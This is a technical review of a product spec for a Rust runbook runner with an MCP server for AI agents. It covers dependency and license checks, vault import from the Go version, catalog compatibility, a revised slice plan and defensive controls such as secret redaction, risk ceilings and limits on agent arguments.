- **Go import verified** (Appendix B). The PRD should specify the envelope exactly as Go writes it, because it is not plain age:
  - `vault.json` = `{"version":1,"data":"age1"+base64.RawStd(<binary age v1 ciphertext>)}`. The literal `age1` prefix is not an age recipient, and there is no base64 padding (`internal/crypto/age.go` `Encrypt`).
  - `keys.txt` = an age identity file with `#` comment lines (`loadOrCreateIdentity`).
  - Parse with `age::IdentityFile::from_buffer`. Import is copy-once and read-only on `~/.dops`, and records an import marker.
- **Keyring semantics are stated twice.** Decision 6 says keyring-*wrapped identity*; §6.5 says the *passphrase* for a passphrase-encrypted identity lives in the keyring. Pick the second: an age scrypt-encrypted identity (the `age` `armor` feature plus the `encrypted` module, `age-0.12.1/src/lib.rs:229,261`) with the passphrase in the keyring.
- **Threat model.** The default (plaintext identity, `0600`, next to the vault) protects only against copying the vault without the keys directory, same as Go. Say so plainly.
- **Crate.** `keyring` 4.2.0's own crate docs say applications should link `keyring-core` plus specific stores, not `keyring` (`keyring-4.2.0/src/lib.rs:1-25`). Its default `v1` feature pulls `zbus-secret-service-keyring-store` → `secret-service` 5.2.0 → `aes` 0.9.3, whose `rust-version` is **1.89**. That breaks the declared MSRV of 1.88 on Linux (§5).
- **`vault.passphrase_cmd`** turns config into code execution. `03` §6 rule 6 expects agents to *edit files* (with review), and a changed `passphrase_cmd` would run at the next vault open. Drop it from MVP; the keyring covers the need. If it stays, require an absolute path owned by the user.
- **Secret entry (B13).** Add `dops vault set <key>`, reading from a TTY prompt or stdin, never argv. `dops config set` must refuse vault keys. `dops run --param <secret>=…` should refuse or warn, because argv lands in shell history and `ps`.
- **MCP never writes the vault (B2).** Go already behaves this way; make it a stated rule with a test.
- Directory modes: vault and keys directories `0700`, files `0600`.

### 4.6 History masking

- The parameter map masks secrets as `****`. That is correct and matches Go.
- **Logs are not redacted in the PRD. Required (B3):** redact in the line stream *before* the log write, so the MCP result, the on-disk log, and the TUI all see the same text. Redact these forms of every secret value injected into the child: the literal value, its standard base64, base64 of `user:value` (HTTP Basic, which `curl -u` sends), and its URL encoding. Apply a minimum length (e.g. 8) so short values do not shred output. Also redact secret values supplied through CLI `--param`.
- **Fresh tier.** Keep the last 7 days of logs as plain `0600` files (the v0.12 spec's fresh tier) and compress after that. `log_path` for a running or recent run must be a plain file.
- History and pending directories `0700`, files `0600` (Go hardened this in `795d2d2`).
- `mcp_client` comes from self-reported `clientInfo.name`. It is a label, not an identity. Fine, but say so.
- Retention for `pending/` and `proposed/` is unspecified. Use a 30-day default.

### 4.7 Propose / accept

Required (B7): the `catalog` pattern and containment check, size caps, strict-load at propose time, `proposal_id`, and v2 scaffolds (`format_version: 2`). Accept targets only user-owned catalogs under `~/.config/dops/catalogs/`, with `user` as the default. Accept never writes into a git-backed catalog's working tree. Accept prints the diff and asks y/N, with `--yes` for scripts. The propose side is safe to ship early: it writes a draft and never executes.

---

## 5. Rust workspace and dependency review

### 5.1 Versions and licenses (re-verified from crates.io on 2026-09-11)

Every PRD row matches `max_stable_version` and the license field exactly. MSRV is each crate's `rust_version`.

| Crate | PRD | crates.io | License | rust-version | Verdict |
|---|---|---|---|---|---|
| clap / clap_complete | 4.6.6 / 4.6.9 | same | MIT OR Apache-2.0 | 1.85 | Accept |
| ratatui / crossterm | 0.30.2 / 0.29.0 | same | MIT | 1.88.0 / 1.63.0 | Accept |
| rmcp / rmcp-macros | 3.3.0 | same (published 2026-09-10) | Apache-2.0 | 1.88 | Accept (fit below) |
| tokio | 1.53.1 | same | MIT | 1.71 | Accept. Name the features (`rt-multi-thread`, `process`, `signal`, `io-util`, `macros`). |
| serde / serde_json | 1.0.229 / 1.0.151 | same | MIT OR Apache-2.0 | 1.56 / 1.71 | Accept |
| serde-yaml-ng | 0.10.0 | same (canonical `serde_yaml_ng`) | MIT | 1.64 | Accept with watch. Last release 2024-05-26; wraps `unsafe-libyaml` 0.2.11, the same parser as deprecated `serde_yaml`. Works on 32/32 (Appendix B). Alternatives: `serde-saphyr` 1.2.0 (pure Rust, rust-version 1.89) or `serde_norway` 0.9.42. |
| toml / toml_edit | 1.1.6 / 0.25.15 | same | MIT OR Apache-2.0 | 1.85 | Accept |
| age | 0.12.1 | same, "[BETA]" | MIT OR Apache-2.0 | 1.74 | Accept. Go import verified. Pulls `i18n-embed`/`fluent` (and old `toml` 0.5.11). |
| directories | 6.0.0 | same | MIT OR Apache-2.0 | — | **Reject** (C1). Also pulls `option-ext` (MPL-2.0). |
| thiserror, uuid, schemars, rust-embed, zeroize | as PRD | same | permissive | 1.71–1.85 | Accept |
| keyring | 4.2.0 | same | MIT OR Apache-2.0 | 1.88.0 | **Reject as specified.** Use `keyring-core` 1.0.0 + `apple-native-keyring-store` 1.0.2 (both MIT OR Apache-2.0, rust-version 1.85). Linux `zbus-secret-service-keyring-store` 1.0.1 (rust-version 1.88) goes behind its own feature. |
| tracing / tracing-subscriber | 0.1.44 / 0.3.23 | same | MIT | 1.65.0 | Accept |
| camino, fs-err, sha2, humantime, regex | as PRD | same | MIT OR Apache-2.0 | ≤ 1.85 | Accept |
| dev: assert_cmd, predicates, tempfile, insta, proptest | as PRD | same | as PRD | ≤ 1.85 | Accept |

**Missing from the table** (all verified 2026-09-11):
- `flate2` 1.1.10 + `tar` 0.4.46: history `.log.gz` tar archives.
- `similar` 3.2.0 (Apache-2.0) or `diffy` 0.5.2: `propose_runbook` diff.
- `libc` 0.2.189, `nix` 0.31.3, or `rustix` 1.1.4: `killpg`.
- `base64` 0.23.1: Go vault import.
- `tempfile` as a *runtime* dependency: atomic writes.
- `fs4` 1.1.0: the `06` §3.4 `mine.lock`. `std::fs::File::lock` needs Rust 1.89.
- `etcetera` 0.11.0 (MIT OR Apache-2.0, rust-version 1.87), or ~40 lines of hand-rolled XDG: replacement for `directories`.

### 5.2 MSRV

The declared 1.88 is correct for rmcp, ratatui, and keyring. Full graph resolution (425 packages, all targets) finds one package above it: `aes` 0.9.3 at **1.89**, reached only through `keyring` 4.2.0 `v1` → zbus secret-service. The macOS target is unaffected; the Linux build is not. Fix it with the keyring-core swap, or declare 1.89.

Add an MSRV CI job: `cargo +1.88 check --workspace --all-targets`, or `cargo msrv verify`. Edition 2024 needs ≥ 1.85, so that is fine. The local toolchain is 1.96.0.

### 5.3 rmcp fit

A good fit:
- It is the official SDK.
- stdio comes from `transport-io`.
- It negotiates protocols 2025-03-26 through 2025-11-25 (`LATEST`) and defines 2026-07-28 constants (`model.rs:170-185`).
- It supplies per-request cancellation tokens and tool annotations.
- Its streamable HTTP server has a Host allowlist on by default.

Required usage notes:
1. Hand-author `inputSchema` (§3.1).
2. Build with `default-features = false`, features `["server", "macros", "transport-io"]`, and HTTP behind a `dops` cargo feature, so stdio builds carry no HTTP stack.
3. If HTTP ships, set `allowed_origins` (non-empty rejects foreign browser origins) and require a per-launch bearer token (B11).
4. rmcp pulls `schemars` 1.0 with `chrono04`. The PRD's `schemars` 1.2.2 is compatible.

### 5.4 Licenses

The full resolved graph has 425 packages across all targets. Every package offers a permissive option. These need an explicit policy (`02` §7.15):
- `option-ext` MPL-2.0 (goes away with `directories`)
- `self_cell` `Apache-2.0 OR GPL-2.0-only` (via age → fluent; take Apache)
- `r-efi` `MIT OR Apache-2.0 OR LGPL-2.1-or-later`
- `termina` `MIT OR MPL-2.0`, and `terminfo` WTFPL (in lock resolution)
- `ryu` `Apache-2.0 OR BSL-1.0`
- Unicode-3.0 / Unicode-DFS-2016

Add `cargo-deny` (0.20.2, rust-version 1.88) with a license allowlist plus advisories to CI. rmcp is Apache-2.0-only, which is fine for an MIT binary but needs NOTICE handling in release archives.

### 5.5 Workspace

The six-crate split is right. `catalogs/starter/` lives outside `crates/dops/`, so `rust-embed` needs a path above the crate root, which `cargo package` rejects. Move it to `crates/dops/starter/`, or keep it and never publish the crate. Publishing is gated anyway.

---

## 6. Catalog v1/v2 compatibility (32 Sesami files and `scripts/`)

All facts come from disk at `091b7ed`, parsed with PyYAML and, separately, with serde_yaml_ng 0.10.0 (Appendix B).

| Check | Result | PRD impact |
|---|---|---|
| Files | 32 `src/*/runbook.yaml` | Matches. |
| Top-level keys | Exactly `name, version, description, risk_level, script, parameters` in all 32. No `id`, `aliases`, `type`, `trigger`, or `format_version`. | The strict loader must know those absent keys too (Go has `trigger`, `type`, `aliases`, `id`). |
| Parameter keys | ⊆ `name, type, required, description, scope, default, secret, options` | Matches the Go `Parameter`. |
| Strict parse (`deny_unknown_fields`, Go key set + `format_version`) | **32/32 OK** | Decision 12 is safe for Sesami. |
| `name` == dirname | 32/32 | Enforcement costs nothing here. |
| `script` | `script.sh` × 32 | v1 default holds. |
| `version` | Unquoted `1.0.0`/`1.0.1` (YAML strings). A synthetic `version: 1.0` float also deserializes to `"1.0"` under serde_yaml_ng. | No issue. |
| Risk mix | low 5, medium 25, high 1, critical 1 | Matches §6.2. |
| Types | string 142, boolean 86, select 5 (all with `options`), number 1 | Matches `01` §4.3. |
| Scopes | global 87, runbook 146, local 1 | Matches §4.6. |
| **Defaults** | 176 declared, **all YAML strings**, including all 86 boolean defaults (`"false"`/`"true"`) and the `number` default `"60"` | **The loader must coerce string defaults to the declared type** (and reject uncoercible ones). A typed default field fails 87 params. Blocking for slice 2 (B9). |
| Required with empty default | `ses-argocd-sync.app_name`: `required: true`, `default: ""`, `scope: local` | Define: an empty default does not satisfy `required`. |
| Param names | 24 distinct, all `^[a-z][a-z0-9_]*$` | Env rule is safe. `env` → `ENV` must stay allowed (§4.1). |
| Secrets | 29 × `jenkins_token`, no defaults | Matches. |
| Scripts | All 32 `#!/bin/sh`, 762–3,809 B | `/bin/sh` contract holds. |
| Shared helpers | `scripts/trigger-pipeline.sh` (bash, 12,861 B, exec bit, called directly by 29 wrappers) and `scripts/scan-jenkins-pipelines.sh` (maintainer tool) | The loader must ignore `scripts/`. It already does (no `runbook.yaml`). Describe should point at helpers (C13). |
| `REPO_ROOT` | `$(cd "$(dirname "$0")/../.." && pwd)` from `src/<rb>/script.sh` | Works for `path=<repo>, sub_path=src` (PRD) and `path=<repo>/src` (Go-style). Same files. |
| Extra files in a runbook dir | `device-log-metrics/{collect.sh, compare.py, report.py, lib/, envs/, tests/}`; it writes `snapshots/` into its own dir | "Loader must not assume two files" holds. A git-backed or read-only install gets dirtied; that is a catalog concern. `envs/*.env` are catalog files that describe never returns. |
| Low-risk Jenkins | `helm-package`, `sdo-k8s-ses`, `ses-automation` | Visible and runnable by a default agent (§4.3). |
| Run length | Jenkins console streaming until the build completes | Timeout/`running` model needed (B5). |

**`catalog.yaml` (v2):** as written (§4.5), catalog parameters merge into every runbook. A Sesami migration would inject `JENKINS_TOKEN` into `clone-ses-repos`, `device-log-metrics`, and `ses-argocd-sync`, and make them *require* Jenkins credentials. **Required (B9):**
- Shared params are opt-in per runbook (e.g. `uses: [jenkins]` naming a parameter group in `catalog.yaml`).
- v1 and v2 files may coexist in one catalog, so migration can be incremental.
- A runbook's own declaration replaces the whole shared param.
- Declaration order is defined: shared first, in the `uses` order.

**Catalog rename:** Sesami has zero `catalog`-scope params. Re-adding as `jenkins-pipelines` over an existing `src` registration keeps the 87 global credentials but loses the saved runbook-scope values (`branch`, `version`, toggles). That is acceptable and documented (decision 3). A later `dops catalog rename --migrate-vault` would remove the pain. Suggestion only.

---

## 7. Slice plan review

| Slice | Order | Done-check defects | Missing tests |
|---|---|---|---|
| 1 | OK | — | `DOPS_HOME` vs `XDG_*_HOME` precedence (decide whether XDG env counts as a second override under `03` §1 rule 1). macOS paths are `~/.config`, not Application Support. Config file `0600`. |
| 2 | OK | **"prints 32 ids"**: at the default human ceiling (`medium`), `ses-release-build` and `ses-deploy` are hidden. The command prints 30 unless the test config raises the catalog policy. | String-default coercion (87 cases). Unknown-key rejection. Env-name and reserved-name rules. `catalog.yaml` opt-in (a non-Jenkins runbook gets no `JENKINS_*`). Mixed v1/v2. Per-catalog failure isolation. CI fixture policy (B15). |
| 3 | Needs the starter | **Uses `starter.hello-world`**, but the embed is slice 8. | stdin is `/dev/null`. stdout/stderr piped. SIGTERM→SIGKILL group on cancel and timeout. cwd. A bash helper invoked from `sh` keeps bash. `PATH` clobber rejected. args→env serialization per type. |
| 4 | OK | "saving `jenkins_user` via CLI" names no command. | `dops vault set` from stdin. The Go import test can be real now (Appendix B method): exact envelope, commented `keys.txt`, wrong key gives a clean error, import is idempotent and non-destructive. Directory `0700`. keyring-core feature compiles on the macOS target. |
| 5 | **Too early for what it ships** | Returns `history_id`/`log_path` before history exists (C10). "describe `cc4-aaa` has `secret_param_names`" fails at the default agent ceiling (`cc4-aaa` is medium), so the test needs `allow_risk = "medium"`. "hides high/critical" at `low` is too weak: assert exactly the five low ids. | stdout purity under MCP. `notifications/cancelled` kills the group. A script echoing `$JENKINS_TOKEN` shows `****` in the result **and** the log. Parent `FOO_TOKEN` is invisible under MCP. MCP args cannot set `jenkins_url` (global scope). MCP never writes the vault. `isError` per error kind. `max_wait` returns `running`. Budget snapshot of the **four-tool** payload, with the propose schema as a fixture even if unregistered. |
| 6 | OK after 5 absorbs history | Tests assume default config; they need `allow_risk ≥ high` (§4.4). **Done is vacuous.** Replace with: catalog policy `critical` + `allow_risk = "critical"`; `ses-deploy` (not allow-listed) → `pending_grant`; approve executes with the pinned sha; after a script change, approve is refused. | TTL expiry. Dedupe. `pending_path` updated with the outcome. Approve runs in the CLI environment. |
| 7 | Propose should move earlier | — | Path traversal via `catalog`. Size caps. yaml/field mismatch. Accept into a git-backed catalog is refused. Accept prints the diff. Strict load at propose time. |
| 8 | OK once the starter embed moves out | — | First-run with the renamed starter params. The palette chord works in Terminal.app (or pick a successor). `q` types in text inputs. Installer checksum mismatch aborts. |
| 9 | OK | — | Staging visibility at the default ceiling. `format_version: 2` drafts. `proposed/` layout. No `active = true` path. |

**Cross-cutting:** the plan has no CI definition. Add one job covering `cargo fmt --check`, `clippy -D warnings`, `test`, the MSRV check, `cargo-deny`, and the budget snapshot, on **macOS and Linux**. `/bin/sh` differs between them.

**Three tools, then four (planner note):** not shipping a dummy tool is right. But slice 5 is "the first agent-usable ship", and without `propose_runbook` it lacks the `03` §9 rule 2 loop (no runbook → propose). The propose half has no execution risk.

**Move before or into slice 5:**
1. Starter embed, with renamed params (from slice 8).
2. History write path: records, `interface`, `mcp_client`, masking, plain fresh logs (from slice 6).
3. Stream redaction for both result and log.
4. MCP env allowlist.
5. MCP arg scope lock and no MCP vault writes.
6. `exec.timeout`, `max_wait`/`running`, cancel wiring, concurrency limit.
7. The §4.3 visibility formula. `pending_grant` itself can stay in slice 6 as long as high/critical stay hidden.
8. `propose_runbook` + `dops catalog accept` (from slice 7), so the fourth tool and its budget land once.
9. HTTP: either defer it past slice 5 or ship Origin plus token.

---

## 8. Required revisions and suggestions

### 8.1 Blocking (ranked; fix in the PRD before the named slice starts)

| Rank | ID | Revision | Blocks |
|---|---|---|---|
| 1 | B4 | **One visibility and grant state machine.** State the §4.3 formula (Go catalog-overrides-global semantics). A hidden runbook returns `no_such_runbook` everywhere. `pending_grant` only for visible, high/critical, not allow-listed. Fix §5.5, §6.4, the wire description, and the slice 6 tests. The pending record gets a sha/HEAD pin, 24 h TTL, dedupe, and `pending_path` outcome. | 5 (visibility), 6 (pending) |
| 2 | B2 | **No secret exfiltration through arguments.** MCP `args` may set only `local`/`runbook`-scope params (or a per-param `agent: false`). `global`/`catalog` values come only from the vault or defaults. MCP never writes the vault. | 5 |
| 3 | B5 | **MCP child environment and run lifecycle.** Env allowlist plus `[exec] pass_env`. `exec.timeout`. `mcp.max_wait` → `status: running`. `notifications/cancelled`, stdio EOF, and timeout → SIGTERM then SIGKILL of the process group. Concurrency limit. stdin `/dev/null` and piped stdout as tested invariants. | 3, 5 |
| 4 | B3 | **Redact before persisting; logs the agent can read.** Stream-level redaction of literal, base64, `user:value` base64, and URL-encoded forms, with a minimum length. Plain-text fresh-tier logs (7 d) before gzip-tar. Directories `0700`, files `0600`. Retention for pending and proposed records. | 5 |
| 5 | B8 | **Re-cut the slice plan** as in §7. Move the starter embed, history, redaction, env allowlist, arg lock, lifecycle, and propose/accept into or before slice 5. Fix the slice 2, 5, and 6 done checks and tests. Add the CI job. | plan |
| 6 | B1 | **Meet the token budget and fix the result contract.** Rewrite the four schemas (Appendix A, 2,018 B). Drop `$schema`/`$id`/`title`. Hand-author `inputSchema`. Gate at 2,800 B or with a tokenizer, counting `initialize`. Compact JSON. `isError` rules. `describe` returns `args_schema` + `resolved` + capped script. Define `summary`. Advertise only `tools`. | 5 |
| 7 | B6 | **Env naming and serialization.** Param name regex, reserved names, per-type args→env serialization. Rename the starter `path` params and drop `getent`. | 2, 3 |
| 8 | B7 | **Harden `propose_runbook`/accept.** `catalog` pattern plus containment, size caps, required `risk_level`, strict load at propose, yaml/field mismatch rejection, `proposal_id`, accept only into user-owned catalogs with a diff and y/N. | 5 (if moved), 7 |
| 9 | B9 | **Loader and `catalog.yaml`.** Coerce string defaults per type. Complete known-key lists. Per-catalog failure isolation (a bad team catalog never takes down starter or MCP). Empty default does not satisfy required. Opt-in shared params, mixed v1/v2, replace-whole-param merge. | 2 |
| 10 | B10 | **XDG paths.** Replace `directories` (macOS Application Support, no state dir) with `etcetera`'s XDG strategy or hand-rolled XDG. | 1 |
| 11 | B11 | **HTTP transport.** Set rmcp `allowed_origins` (reject foreign Origins), require a per-launch bearer token, keep the loopback refusal. Or remove HTTP from slice 5. | 5 |
| 12 | B12 | **Vault crypto and keyring.** Specify the Go envelope byte-for-byte (§4.5). Choose passphrase-in-keyring semantics. `keyring-core` + `apple-native-keyring-store` instead of `keyring` 4.2.0. Resolve MSRV (1.88 vs `aes` 0.9.3 at 1.89 on Linux) and add an MSRV CI check. | 4 |
| 13 | B13 | **Secret entry.** `dops vault set <key>` from TTY/stdin. `dops config set` refuses vault keys. CLI `--param` for secret names refused or warned. Fix §1.2 and §7.3. | 4 |
| 14 | B14 | **Staging model.** Visible regardless of ceiling (never runnable). Reserved `mined`/`proposed` names (drop `[mine] catalog`). A `proposed/` layout the loader can scan. `accept --into`. Remove the `active = true` path. The miner writes `format_version: 2`. | 7, 9 |
| 15 | B15 | **Compatibility fixtures in CI.** CI cannot read `~/Bitbucket`. Vendor sanitized fixtures (shape-preserving; strip internal hostnames and pipeline paths) plus a `DOPS_TEST_CATALOG` local run against the real tree. Publication gating for internal names (`ci.sesami.io` and the Bitbucket workspace appear in PRD examples). | 2 |

### 8.2 Suggestions (non-blocking)

1. MCP tool annotations (`readOnlyHint`, `destructiveHint`, `openWorldHint`), about 160 B within budget.
2. `describe_runbook` returns `catalog_root` and a list of files the script references, so agents can read Sesami's `trigger-pipeline.sh` (C13).
3. Pin `dops grant allow` to a script digest (`--any-version` to opt out).
4. Drop `vault.passphrase_cmd` from MVP.
5. Either add `mcp.max_output_lines` to `03` §7 rule 5's configurable list (`02` §7.4 asks for it) or make it a constant.
6. `cargo-deny` licenses and advisories, with the exceptions in §5.4.
7. Watch `serde_yaml_ng` maintenance. Keep the 32-file round-trip as the swap guard.
8. Move `catalogs/starter/` under `crates/dops/`.
9. Palette chord: `Ctrl+p` or `:`, with `Ctrl+Shift+p` as an alias where the terminal reports it.
10. Document the cwd change from Go and SIGTERM-before-SIGKILL.
11. `dops mcp schema --bytes`, to print the served `tools/list` and its size (operator visibility of the budget).
12. `dops catalog rename --migrate-vault` later, for `src` → `jenkins-pipelines`.
13. Sesami catalog hygiene, outside this repo: drop the `~/.bashrc` credential `eval`, stop printing `-u user:pass` in `--dry-run`, and review `curl -k`.
14. State that `mcp_client` is self-reported.
15. Decide whether `XDG_*_HOME` counts as an override next to `DOPS_HOME` (`03` §1 rule 1 says `DOPS_HOME` is the only one).

---

## 9. Planner notes, answered

| Note | Answer |
|---|---|
| `describe_runbook` returns script bodies by default: token cost, cap? | Keep the default on (`03` §9 rule 3). Sesami cost is 762–3,809 B per describe (≤ ~950 tokens). Add a 16 KiB cap with `script_truncated` and always-present `script_sha256`. The bigger issue is that describe returns only the 2 KB wrapper, not the 13 KB helper that does the work (C13). |
| Children inherit the parent environment | Confirmed in Go (`script.go:27`) and in PRD §6.1. Blocking as B5, with an allowlist that still runs all 32 Sesami runbooks (§4.2). |
| Slice 5 ships three tools, then four | Acceptable (no dummy tool), but snapshot the four-tool budget in slice 5. Better, move `propose_runbook` into slice 5 (§7). |
| Go age identity import unverified | **Verified.** age 0.12.1 reads a dops-written `keys.txt` and decrypts a dops-written `vault.json` (Appendix B). The PRD must spell out the non-standard envelope (`age1` + unpadded base64). |

---

## 10. What a rename to kadou touches (not applied)

Do the rename before slice 5. After slice 5, client-side tool ids and permission rules start to depend on the server name.

| Surface | Today (PRD) | Rename impact |
|---|---|---|
| Binary | `dops` | `kadou`. It also removes the PATH collision with the installed Go `dops` during side-by-side migration. |
| Crates | `dops`, `dops-core`, `dops-exec`, `dops-mcp`, `dops-tui`, `dops-mine` | `kadou-*`. crates.io name availability not checked (publishing is gated). |
| Config / data / state dirs | `~/.config/dops`, `~/.local/share/dops`, `~/.local/state/dops` | `…/kadou`. The legacy import source `~/.dops/` stays literal (Go product). |
| Env prefix | `DOPS_HOME`, `DOPS_INSTALL_DIR`, `DOPS_TEST_CATALOG`; reserved-env denylist `DOPS_*` | `KADOU_*`. Decide whether to honor `DOPS_HOME` for one release. |
| MCP server name | `serverInfo.name = "dops"`; snippet `mcpServers.dops` | `kadou`. Host-side tool ids change (e.g. `mcp__dops__run_runbook` → `mcp__kadou__run_runbook` in Claude Code), so allowlists and hooks need updating. |
| Schema `$id` URIs | `dops://schema/tools/*` | Drop them (B1). Otherwise `kadou://`. |
| Strings in results and descriptions | `accept: "dops catalog accept …"`, staging message, `--confirm` hint, `propose_runbook` description | Update. The strings count toward the budget. |
| Keyring | service `dops`, account `vault-identity` | Service `kadou`. Migrate or re-prompt. |
| Mining | LaunchAgent label `dev.dops.mine`, `SKILL.md` exec `dops mine`, `~/.config/dops/mine/redact-extra.txt` | Rename the label and paths. `install-schedule` must remove the old plist. |
| Install and release | install URL, archive names, `SHA256SUMS`, Homebrew formula | Rename. Gated. |
| Product theme | `doop` | Naming-adjacent. Decide in phase 4, not implied by the binary name. |
| Sesami catalog text | Comments like "passed as environment variables by dops"; `SPEC.md` `dops catalog add` | Cosmetic. Separate repo. |
| Unaffected | `runbook.yaml` format, param→env mapping, vault payload shape, history record fields | — |

---

## Appendix A — trimmed `tools/list` (2,018 B compact, ~504 tok @4)

Illustrative wording. The revision may choose its own, but it must stay under the gate.

```json
{"tools":[
 {"name":"list_runbooks","description":"Search runbooks visible to this agent. Returns id, one-line description, risk. No schemas.",
  "inputSchema":{"type":"object","additionalProperties":false,"properties":{
   "query":{"type":"string","description":"Substring of id, alias, or description."},
   "catalog":{"type":"string"},
   "risk":{"type":"string","enum":["low","medium","high","critical"]},
   "limit":{"type":"integer","minimum":1,"maximum":200,"default":50},
   "offset":{"type":"integer","minimum":0,"default":0},
   "include_staging":{"type":"boolean","default":false,"description":"Also list non-runnable drafts (mined, proposed)."}}}},
 {"name":"describe_runbook","description":"Get one runbook: args schema, risk, script. Read it before run_runbook.",
  "inputSchema":{"type":"object","additionalProperties":false,"required":["id"],"properties":{
   "id":{"type":"string","description":"catalog.runbook or alias."},
   "include_script":{"type":"boolean","default":true}}}},
 {"name":"run_runbook","description":"Run one runbook with args. Secrets come from the local vault; never pass them. Above your grant it does not run and returns pending_grant.",
  "inputSchema":{"type":"object","additionalProperties":false,"required":["id"],"properties":{
   "id":{"type":"string"},
   "args":{"type":"object","description":"Parameter name to value, per describe_runbook."},
   "dry_run":{"type":"boolean","default":false}}}},
 {"name":"propose_runbook","description":"Draft a new runbook for human review. Writes files and returns a diff; never registers or runs it.",
  "inputSchema":{"type":"object","additionalProperties":false,"required":["catalog","name","description","risk_level"],"properties":{
   "catalog":{"type":"string","pattern":"^[a-z0-9][a-z0-9-]*$"},
   "name":{"type":"string","pattern":"^[a-z0-9][a-z0-9-]*$","maxLength":64},
   "description":{"type":"string","minLength":1,"maxLength":200},
   "risk_level":{"type":"string","enum":["low","medium","high","critical"]},
   "yaml":{"type":"string","maxLength":16384},
   "script":{"type":"string","maxLength":65536}}}}
]}
```

---

## Appendix B — method and evidence

All probes ran in the session scratchpad, outside this repo. Nothing was written to `~/origin/dops` or `~/Bitbucket/sdo-dops-catalog`.

1. **crates.io.** `GET https://crates.io/api/v1/crates/<name>` for every PRD crate plus alternatives, on 2026-09-11. Recorded: `max_stable_version`, `license`, `rust_version`, `updated_at`. Sources of `rmcp` 3.3.0, `keyring` 4.2.0, `age` 0.12.1, `directories` 6.0.0, and `serde_yaml_ng` 0.10.0 were downloaded from `static.crates.io` and read (file/line citations above).
2. **Full dependency graph.** A scratch crate with every PRD dependency at the PRD versions. `cargo metadata` gave 425 packages (licenses, `rust_version`). `cargo tree -i` traced `aes@0.9.3` → `secret-service` 5.2.0 → `zbus-secret-service-keyring-store` 1.0.1 → `keyring` 4.2.0, plus `hpke`, `self_cell`, `option-ext`, and `toml@0.5.11`.
3. **Catalog facts.** PyYAML 6.0.3 over `src/*/runbook.yaml` for keys, types, scopes, defaults, names, and risk. Shell inspection of `script.sh` shebangs, sizes, exec bits, and `trigger-pipeline.sh`. No `envs/*.env` contents read.
4. **Strict YAML.** Rust 1.96.0, `serde_yaml_ng` 0.10.0, structs with `#[serde(deny_unknown_fields)]` over the Go key set plus `format_version`: 32/32 parse. Counted 86 boolean and 1 number defaults as YAML strings. Synthetic `version: 1.0` → `"1.0"`. Synthetic unknown key → error.
5. **Go vault interop.** Copied `~/origin/dops/internal/crypto/{age.go,encrypter.go}` (not `mask.go`) into a scratch Go module with `filippo.io/age` v1.3.1 (the version in dops `go.mod`). `NewAgeEncrypter` + `Encrypt` wrote `keys/keys.txt` and a `vault.json` envelope mirroring `internal/vault/vault.go` `Save`, over a synthetic payload (`jenkins_token: "SYNTHETIC-NOT-A-SECRET"`). The Rust `age` 0.12.1 path `IdentityFile::from_buffer` → strip `age1` → base64 `STANDARD_NO_PAD` → `Decryptor::new` → `decrypt` returned the payload: version 1, 1 identity, keys `jenkins_token, jenkins_url, jenkins_user`.
6. **Budget.** Python serialized the four PRD §5.4 blocks (name + description + inputSchema) compactly. Rust `rmcp::handler::server::common::schema_for_input` + `rmcp::model::Tool::new` over equivalent input types; `serde_json::to_string` of `{"tools":[…]}`. Result sizes were built from Sesami YAML in the PRD's §5.5 shapes.

**Not verified:** live MCP host behavior (per-call timeouts, tool-search deferral) and a real tokenizer count. Token figures are byte-ratio estimates, like the PRD's. The Linux `/bin/sh` (dash) behavior of Sesami scripts was not run. rmcp's HTTP server was not started, only its source read. The license notes are metadata, not legal review.
